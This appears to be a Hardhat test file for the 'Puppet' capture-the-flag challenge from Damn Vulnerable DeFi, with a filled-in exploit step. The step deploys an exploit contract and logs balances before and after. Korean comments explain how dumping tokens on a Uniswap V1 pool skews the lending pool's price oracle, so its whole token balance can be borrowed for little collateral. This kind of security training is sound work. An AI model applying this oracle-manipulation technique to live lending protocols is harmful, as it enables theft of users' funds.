const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require("hardhat");
const { expect } = require("chai");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(
  tokensSold,
  tokensInReserve,
  etherInReserve
) {
  return tokensSold
    .mul(ethers.BigNumber.from("997"))
    .mul(etherInReserve)
    .div(
      tokensInReserve
        .mul(ethers.BigNumber.from("1000"))
        .add(tokensSold.mul(ethers.BigNumber.from("997")))
    );
}

describe("[Challenge] Puppet", function () {
  let deployer, attacker;

  // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther("10");
  const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther("10");

  const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther("1000");
  const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther("25");
  const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther("100000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const UniswapExchangeFactory = new ethers.ContractFactory(
      exchangeJson.abi,
      exchangeJson.evm.bytecode,
      deployer
    );
    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.evm.bytecode,
      deployer
    );

    const DamnValuableTokenFactory = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const PuppetPoolFactory = await ethers.getContractFactory(
      "PuppetPool",
      deployer
    );

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x15af1d78b58c40000", // 25 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ATTACKER_INITIAL_ETH_BALANCE
    );

    // Deploy token to be traded in Uniswap
    this.token = await DamnValuableTokenFactory.deploy();

    // Deploy a exchange that will be used as the factory template
    this.exchangeTemplate = await UniswapExchangeFactory.deploy();

    // Deploy factory, initializing it with the address of the template exchange
    this.uniswapFactory = await UniswapFactoryFactory.deploy();
    await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

    // Create a new exchange for the token, and retrieve the deployed exchange's address
    let tx = await this.uniswapFactory.createExchange(this.token.address, {
      gasLimit: 1e6,
    });
    const { events } = await tx.wait();
    this.uniswapExchange = await UniswapExchangeFactory.attach(
      events[0].args.exchange
    );

    // Deploy the lending pool
    this.lendingPool = await PuppetPoolFactory.deploy(
      this.token.address,
      this.uniswapExchange.address
    );

    // Add initial token and ETH liquidity to the pool
    await this.token.approve(
      this.uniswapExchange.address,
      UNISWAP_INITIAL_TOKEN_RESERVE
    );
    await this.uniswapExchange.addLiquidity(
      0, // min_liquidity
      UNISWAP_INITIAL_TOKEN_RESERVE,
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
    );

    // Ensure Uniswap exchange is working as expected
    expect(
      await this.uniswapExchange.getTokenToEthInputPrice(
        ethers.utils.parseEther("1"),
        { gasLimit: 1e6 }
      )
    ).to.be.eq(
      calculateTokenToEthInputPrice(
        ethers.utils.parseEther("1"),
        UNISWAP_INITIAL_TOKEN_RESERVE,
        UNISWAP_INITIAL_ETH_RESERVE
      )
    );

    const extt = calculateTokenToEthInputPrice(
      ethers.utils.parseEther("1"),
      UNISWAP_INITIAL_TOKEN_RESERVE,
      UNISWAP_INITIAL_ETH_RESERVE
    );

    console.log(
      "up uin",
      (
        await this.uniswapExchange.getTokenToEthInputPrice(
          ethers.utils.parseEther("1"),
          { gasLimit: 1e6 }
        )
      ).toString()
    );

    // Setup initial token balances of pool and attacker account
    await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
    await this.token.transfer(
      this.lendingPool.address,
      POOL_INITIAL_TOKEN_BALANCE
    );

    // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
    expect(
      await this.lendingPool.calculateDepositRequired(
        ethers.utils.parseEther("1")
      )
    ).to.be.eq(ethers.utils.parseEther("2"));

    expect(
      await this.lendingPool.calculateDepositRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )
    ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul("2"));
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    console.log("==============================");
    console.log("======= EXPLOIT START ========");
    console.log("==============================");
    const PuppetExploitFactory = await ethers.getContractFactory(
      "PuppetExploit",
      attacker
    );
    console.log(
      "attack전 attacker ETH balance1",
      (await attacker.getBalance()).toString()
    ); // 25.000000000000000000

    // 배포할때 24ETH를 보냄.
    this.PuppetExploitContract = await PuppetExploitFactory.deploy(
      this.token.address,
      this.uniswapExchange.address,
      this.lendingPool.address,
      { value: ethers.utils.parseEther("24") }
    );

    console.log(
      "attack전 attacker DVT balance",
      (await this.token.balanceOf(attacker.address)).toString()
    ); //attacker에게 1000 DVT가 있어.
    console.log(
      "attack전 attacker ETH balance",
      (await attacker.getBalance()).toString()
    ); // 0.999031147364173276
    console.log(
      "attack전 PuppetExploitContract DVT balance",
      (
        await this.token.balanceOf(this.PuppetExploitContract.address)
      ).toString()
    );
    console.log(
      "attack전 PuppetExploitContract ETH balance",
      (
        await ethers.provider.getBalance(this.PuppetExploitContract.address)
      ).toString()
    );
    console.log(
      "attack전 uniswwapPair DVT balance",
      (await this.token.balanceOf(this.uniswapExchange.address)).toString()
    );
    console.log(
      "attack전 uniswwapPair ETH balance",
      (
        await ethers.provider.getBalance(this.uniswapExchange.address)
      ).toString()
    );
    console.log(
      "attack전 PuppetPool DVT balance",
      (await this.token.balanceOf(this.lendingPool.address)).toString()
    ); // 100000 000000000000000000
    console.log(
      "attack전 calculateDepositRequired(1)",
      (
        await this.lendingPool.calculateDepositRequired(
          ethers.utils.parseEther("1")
        )
      ).toString()
    );
    //2.000000000000000000

    const initAttackBalan = await this.token.balanceOf(attacker.address);

    const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;

    // attacker가 가지고있는 DVT토큰을 Exploit컨트랙트에 보냄.
    // 1000개
    await this.token
      .connect(attacker)
      .transfer(this.PuppetExploitContract.address, initAttackBalan);
    console.log(
      "attack전 transfer 후 attacker DVT balance",
      (await this.token.balanceOf(attacker.address)).toString()
    );
    // attack()함수 실행
    await this.PuppetExploitContract.attack1();

    console.log(
      "attack후 calculateDepositRequired(100000)",
      (
        await this.lendingPool.calculateDepositRequired(
          ethers.utils.parseEther("100000") //100000
        )
      ).toString()
    );
    //0.000196643298887982
    // 2403.187102166025800000

    console.log("==========ATTACK 후===========");
    console.log(
      "attack후 attacker DVT balance",
      (await this.token.balanceOf(attacker.address)).toString()
    ); //attacker에게 1000 DVT가 있어.

    console.log(
      "attack후 attacker ETH balance",
      (await attacker.getBalance()).toString()
    ); // attacker에게 25 ETH가 있다.

    console.log(
      "attack후 PuppetExploitContract DVT balance",
      (
        await this.token.balanceOf(this.PuppetExploitContract.address)
      ).toString()
    );
    console.log(
      "attack후 PuppetExploitContract ETH balance",
      (
        await ethers.provider.getBalance(this.PuppetExploitContract.address)
      ).toString()
    );
    console.log(
      "attack후 uniswwapPair DVT balance",
      (await this.token.balanceOf(this.uniswapExchange.address)).toString()
    );
    console.log(
      "attack후 uniswwapPair ETH balance",
      (
        await ethers.provider.getBalance(this.uniswapExchange.address)
      ).toString()
    );
    console.log(
      "attack후 PuppetPool DVT balance",
      (await this.token.balanceOf(this.lendingPool.address)).toString()
    ); // 0
    console.log(
      "attack후 calculateDepositRequired(1)",
      (
        await this.lendingPool.calculateDepositRequired(
          ethers.utils.parseEther("1")
        )
      ).toString()
    );
    //calculateDepositRequired
    //전 : 2
    //후 : 0.024031871021660258
    //이거를 uniswapV1에가서 1000DVT -> ETH 로 스왑을해서
    // ETH를 확보한 후에  PuppetPool에 borrow를 이용해서 해야함.

    console.log("==============================");
    console.log("======= EXPLOIT ENDED ========");
    console.log("==============================");
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq("0");
    // A to.be.gt B => A가 B보다 큰가?
    expect(await this.token.balanceOf(attacker.address)).to.be.gt(
      POOL_INITIAL_TOKEN_BALANCE // 100,000
    );
  });
});
